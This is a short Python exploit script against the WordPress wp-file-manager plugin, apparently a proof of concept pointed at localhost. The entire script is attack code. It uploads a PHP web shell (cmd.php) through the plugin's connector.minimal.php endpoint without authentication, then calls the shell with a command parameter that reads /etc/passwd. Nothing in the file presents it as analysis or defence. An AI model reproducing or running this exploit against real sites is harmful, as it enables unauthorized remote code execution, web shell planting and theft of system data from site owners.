#!/usr/local/bin/python3

import requests

url = "http://localhost:8080/wp-content/plugins/wp-file-manager/lib"

def exploit():
	# set post request parameters
	file_name = 'cmd.php'
	cmd = 'cat /etc/passwd'
	data = (
		('upload[]', open(file_name, 'rb')),
		('cmd', (None, 'upload')),
		('target', (None, 'l1_Lw'))
	)	

	# upload php
	res = requests.post("{}/php/connector.minimal.php".format(url), files=data)
	
	print(res.status_code)
	print(res.text)

	# execute php 
	res = requests.get("{0}/files/{1}?cmd={2}".format(url,file_name,cmd))
	
	print(res.status_code)
	print(res.text)

exploit()


